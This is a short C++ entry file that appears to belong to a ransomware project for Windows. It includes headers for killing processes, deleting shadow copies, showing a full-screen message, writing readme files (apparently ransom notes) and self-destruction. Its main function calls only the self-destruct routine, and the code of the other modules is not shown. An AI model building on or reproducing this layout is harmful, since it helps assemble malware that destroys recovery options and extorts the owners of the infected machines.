#include <iostream>
#include <Windows.h>
#include "gen_uid.h"
#include "kill_procs.h"
#include "gen_str.h"
#include "del_shadows.h"
#include "msg_screen.h"
#include "create_readmes.h"
#include "self_dest.h"


/*
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    return ShowFullScreenWindow(hInstance, nCmdShow);
}
*/

int main() {
    self_destruct();
    return 0;
}

